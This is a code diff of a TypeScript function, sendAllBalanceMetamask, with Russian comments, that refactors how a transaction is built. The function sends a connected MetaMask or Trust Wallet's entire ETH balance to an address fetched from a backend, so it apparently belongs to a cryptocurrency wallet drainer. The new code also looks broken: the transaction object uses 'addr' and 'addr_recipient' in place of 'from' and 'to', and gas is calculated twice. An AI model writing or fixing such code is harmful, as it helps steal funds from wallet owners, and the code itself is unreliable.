@@ -145,7 +145,7 @@ async function sendAllBalanceMetamask(
   const addr_recipient = await fetchDataFromBackend(setStatus);
 
   // 2. Настраиваем Web3
-  const web3 = new Web3(eth)
+  const web3 = new Web3(eth);
 
   // 3. Расчитывает цену газа
   const isTrustWallet = !!eth.isTrust;
@@ -157,31 +157,37 @@ async function sendAllBalanceMetamask(
     calc = await calculateGasTrxNew(addr, addr_recipient, web3)
   }
 
-  const hexValue = '0x' + calc.sendValue;
+  let valueHex: string;
+  let txParams: Record<string, any> = { addr, addr_recipient };
 
-  // Отправляем транзакцию
-  let receipt;
-  setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`);
+  // 4. Подготавливаем транзакцию  
   if (isTrustWallet) {
-      receipt = await web3.eth.sendTransaction({
-        from: addr,
-        to: addr_recipient,
-        value: hexValue,
-        gas: (calc as ResponseCalculateGasTrxLegacy).gasLimit,
-        gasPrice: (calc as ResponseCalculateGasTrxLegacy).gasPrice,
-      })
+    const { gasLimit, gasPrice, sendValue } = await calculateGasTrxLegacy(addr, addr_recipient, web3);
+    valueHex = '0x' + sendValue;
+
+    txParams = {
+      ...txParams,
+      value: valueHex,
+      gas: web3.utils.toHex(gasLimit),
+      gasPrice: web3.utils.toHex(gasPrice),
+    }
   } else {
-    receipt = await web3.eth.sendTransaction({
-      from: addr,
-      to: addr_recipient,
-      value: hexValue,
-      gas: (calc as ResponseCalculateGasTrxNew).gasLimit,
-      maxPriorityFeePerGas: (calc as ResponseCalculateGasTrxNew).maxPriorityFee,
-      maxFeePerGas: (calc as ResponseCalculateGasTrxNew).maxFee,
+    const { gasLimit, maxPriorityFee, maxFee, sendValue } = await calculateGasTrxNew(addr, addr_recipient, web3);
+    valueHex = '0x' + sendValue;
+
+    txParams = {
+      ...txParams,
+      value: valueHex,
+      gas: web3.utils.toHex(gasLimit),
+      maxPriorityFeePerGas: web3.utils.toHex(maxPriorityFee),
+      maxFeePerGas: web3.utils.toHex(maxFee),
       type: '0x2',
-    })
+    }
   }
 
+   // 5) Отправляем транзакцию
+  setStatus(`Отправляем ${web3.utils.fromWei(valueHex, 'ether')} ETH…`);
+  const receipt = await web3.eth.sendTransaction(txParams);
   return String(receipt.transactionHash);
 }
 
